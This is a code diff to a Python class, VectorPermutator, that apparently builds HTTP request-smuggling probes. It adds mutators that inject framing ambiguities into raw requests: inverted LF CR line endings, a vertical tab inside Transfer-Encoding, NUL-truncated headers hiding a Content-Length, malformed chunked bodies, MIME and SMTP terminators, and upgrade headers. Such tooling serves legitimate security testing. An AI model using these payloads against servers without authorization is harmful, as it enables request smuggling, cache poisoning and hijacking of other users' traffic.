@@ -39,21 +39,7 @@ class VectorPermutator:
             except Exception:
                 pass
 
-        mutators = [
-            self._mutate_path_nul,
-            self._mutate_path_asterisk_gadget,
-            self._mutate_header_tab_spacing,
-            self._mutate_dual_matching_cl,
-            self._mutate_header_casing_underscore,
-            self._mutate_dangling_byte,
-            self._mutate_multipart_byteranges,
-            self._mutate_line_terminator_bare_lf,
-            self._mutate_line_terminator_bare_cr,
-            self._mutate_line_terminator_double_cr,
-            self._mutate_obs_fold_terminator,
-            self._mutate_http10_te_gzip,
-            self._mutate_intermediary_terminator_headers,
-        ]
+        mutators = self.get_terminator_mutators()
 
         # Pick mutators up to effective_max
         selected_mutators = random.sample(mutators, min(len(mutators), effective_max))
@@ -122,6 +108,36 @@ class VectorPermutator:
                 pass
 
         return variants
+
+    def get_terminator_mutators(self) -> List[Any]:
+        """Returns the complete catalog of 25 protocol terminator & framing mutators."""
+        return [
+            self._mutate_path_nul,
+            self._mutate_path_asterisk_gadget,
+            self._mutate_header_tab_spacing,
+            self._mutate_dual_matching_cl,
+            self._mutate_header_casing_underscore,
+            self._mutate_dangling_byte,
+            self._mutate_multipart_byteranges,
+            self._mutate_line_terminator_bare_lf,
+            self._mutate_line_terminator_bare_cr,
+            self._mutate_line_terminator_double_cr,
+            self._mutate_line_terminator_lfcr,
+            self._mutate_obs_fold_terminator,
+            self._mutate_http10_te_gzip,
+            self._mutate_intermediary_terminator_headers,
+            self._mutate_control_char_vt_ff_terminator,
+            self._mutate_null_byte_header_terminator,
+            self._mutate_chunked_extension_semicolon_terminator,
+            self._mutate_chunked_bare_lf_terminator,
+            self._mutate_chunked_trailer_terminator,
+            self._mutate_mime_boundary_closing_terminator,
+            self._mutate_smtp_dot_bdat_terminator,
+            self._mutate_websocket_upgrade_terminator,
+            self._mutate_early_hints_103_expect_terminator,
+            self._mutate_capsule_datagram_terminator,
+            self._mutate_iso8859_nel_separator_terminator,
+        ]
 
     def combine_triggers(self, probe_a: Dict[str, Any], probe_b: Dict[str, Any]) -> Optional[Dict[str, Any]]:
         """
@@ -267,6 +283,13 @@ class VectorPermutator:
             return req.replace("\r\nHost:", "\r\r\nHost:", 1), "dirty_double_cr_line_terminator"
         return req, ""
 
+    def _mutate_line_terminator_lfcr(self, req: str) -> Tuple[str, str]:
+        """Uses inverted LF CR (\\n\\r) as a header line terminator (RFC 9112 Section 2.2)."""
+        if "\r\n\r\n" in req:
+            mutated = req.replace("\r\n\r\n", "\n\rX-Inverted-LFCR: 1\r\n\r\n", 1)
+            return mutated, "dirty_lfcr_inverted_line_terminator"
+        return req, ""
+
     def _mutate_obs_fold_terminator(self, req: str) -> Tuple[str, str]:
         """Applies RFC 9112 Section 5.2 obsolete line folding (CRLF + SP/HTAB) across header lines."""
         if "\r\n\r\n" in req:
@@ -288,5 +311,96 @@ class VectorPermutator:
         if "\r\n\r\n" in req and "Early-Data:" not in req and "Max-Forwards:" not in req:
             header_insert = "Early-Data: 1\r\nMax-Forwards: 0\r\n"
             return req.replace("\r\n\r\n", f"\r\n{header_insert}\r\n", 1), "intermediary_early_data_max_forwards"
+        return req, ""
+
+    def _mutate_control_char_vt_ff_terminator(self, req: str) -> Tuple[str, str]:
+        """Injects Vertical Tab (0x0B) and Form Feed (0x0C) POSIX isspace() terminators in header lines."""
+        if "\r\n\r\n" in req:
+            vt_ff_insert = "Transfer-Encoding:\x0bchunked\r\nX-FF-Term:\x0c1\r\n"
+            return req.replace("\r\n\r\n", f"\r\n{vt_ff_insert}\r\n", 1), "dirty_vt_ff_control_terminator"
+        return req, ""
+
+    def _mutate_null_byte_header_terminator(self, req: str) -> Tuple[str, str]:
+        """Injects C-string NUL (0x00) byte terminator inside header value to test strlen truncation."""
+        if "\r\n\r\n" in req:
+            nul_insert = "X-Null-Term: prefix\x00Content-Length: 0\r\n"
+            return req.replace("\r\n\r\n", f"\r\n{nul_insert}\r\n", 1), "dirty_null_byte_c_string_terminator"
+        return req, ""
+
+    def _mutate_chunked_extension_semicolon_terminator(self, req: str) -> Tuple[str, str]:
+        """Applies RFC 9112 Section 7.1.1 chunked extension semicolon & BWS terminator framing."""
+        if "\r\n\r\n" in req:
+            head, body = req.split("\r\n\r\n", 1)
+            chunk_hdr = "\r\nTransfer-Encoding: chunked" if "Transfer-Encoding:" not in head else ""
+            chunk_body = f"1 ; ext=\"term\"\r\nZ\r\n0;last-ext=1\r\n\r\n{body}"
+            return f"{head}{chunk_hdr}\r\n\r\n{chunk_body}", "dirty_chunk_extension_semicolon_terminator"
+        return req, ""
+
+    def _mutate_chunked_bare_lf_terminator(self, req: str) -> Tuple[str, str]:
+        """Uses bare LF (\\n) as chunk-size and last-chunk terminators (RFC 9112 Section 7.1)."""
+        if "\r\n\r\n" in req:
+            head, body = req.split("\r\n\r\n", 1)
+            chunk_hdr = "\r\nTransfer-Encoding: chunked" if "Transfer-Encoding:" not in head else ""
+            chunk_body = f"0\n\n{body}"
+            return f"{head}{chunk_hdr}\r\n\r\n{chunk_body}", "dirty_chunk_bare_lf_terminator"
+        return req, ""
+
+    def _mutate_chunked_trailer_terminator(self, req: str) -> Tuple[str, str]:
+        """Appends RFC 9112 Section 7.1.2 Trailer header and post-chunk trailer fields before final CRLF."""
+        if "\r\n\r\n" in req:
+            head, body = req.split("\r\n\r\n", 1)
+            trailer_hdr = "\r\nTransfer-Encoding: chunked\r\nTrailer: X-Trailer-Term"
+            trailer_body = f"0\r\nX-Trailer-Term: 1\r\n\r\n{body}"
+            return f"{head}{trailer_hdr}\r\n\r\n{trailer_body}", "clean_chunked_trailer_section_terminator"
+        return req, ""
+
+    def _mutate_mime_boundary_closing_terminator(self, req: str) -> Tuple[str, str]:
+        """Injects RFC 2046 Section 5.1.1 MIME closing boundary (--BOUND--) before trailing payload."""
+        if "\r\n\r\n" in req:
+            head, body = req.split("\r\n\r\n", 1)
+            mime_hdr = "\r\nContent-Type: multipart/mixed; boundary=BOUND" if "boundary=" not in head else ""
+            mime_body = f"--BOUND\r\nContent-Type: text/plain\r\n\r\npart\r\n--BOUND--\r\n{body}"
+            return f"{head}{mime_hdr}\r\n\r\n{mime_body}", "dirty_mime_closing_boundary_terminator"
+        return req, ""
+
+    def _mutate_smtp_dot_bdat_terminator(self, req: str) -> Tuple[str, str]:
+        """Applies cross-protocol SMTP dot-stuffing (\\r\\n.\\r\\n) and BDAT LAST terminators (RFC 5321 / RFC 3030)."""
+        if "\r\n\r\n" in req:
+            head, body = req.split("\r\n\r\n", 1)
+            smtp_body = f"BDAT 0 LAST\r\n.\r\n{body}"
+            return f"{head}\r\n\r\n{smtp_body}", "dirty_smtp_dot_bdat_cross_protocol_terminator"
+        return req, ""
+
+    def _mutate_websocket_upgrade_terminator(self, req: str) -> Tuple[str, str]:
+        """Injects RFC 6455 / RFC 8441 WebSocket Upgrade handshake headers to test tunnel stream termination."""
+        if "\r\n\r\n" in req and "Upgrade:" not in req:
+            ws_headers = (
+                "Connection: Upgrade\r\n"
+                "Upgrade: websocket\r\n"
+                "Sec-WebSocket-Version: 13\r\n"
+                "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
+            )
+            return req.replace("\r\n\r\n", f"\r\n{ws_headers}\r\n", 1), "clean_websocket_upgrade_handshake_terminator"
+        return req, ""
+
+    def _mutate_early_hints_103_expect_terminator(self, req: str) -> Tuple[str, str]:
+        """Injects Expect: 100-continue and Prefer: wait=0 interim response boundary terminators (RFC 9110 / RFC 8297)."""
+        if "\r\n\r\n" in req and "Expect:" not in req:
+            interim_headers = "Expect: 100-continue\r\nPrefer: wait=0\r\n"
+            return req.replace("\r\n\r\n", f"\r\n{interim_headers}\r\n", 1), "clean_expect_100_continue_interim_terminator"
+        return req, ""
+
+    def _mutate_capsule_datagram_terminator(self, req: str) -> Tuple[str, str]:
+        """Injects RFC 9297 Capsule-Protocol: ?1 and RFC 9298 connect-udp upgrade terminators."""
+        if "\r\n\r\n" in req and "Capsule-Protocol:" not in req:
+            capsule_headers = "Capsule-Protocol: ?1\r\nUpgrade: connect-udp\r\nConnection: Upgrade\r\n"
+            return req.replace("\r\n\r\n", f"\r\n{capsule_headers}\r\n", 1), "clean_capsule_protocol_terminator"
+        return req, ""
+
+    def _mutate_iso8859_nel_separator_terminator(self, req: str) -> Tuple[str, str]:
+        """Injects ISO-8859-1 Next Line (0x85) and ASCII Record Separator (0x1E) terminators in headers."""
+        if "\r\n\r\n" in req:
+            nel_insert = "X-NEL-Term: line1\x85X-RS-Term: line2\x1e\r\n"
+            return req.replace("\r\n\r\n", f"\r\n{nel_insert}\r\n", 1), "dirty_nel_record_separator_terminator"
         return req, ""
 
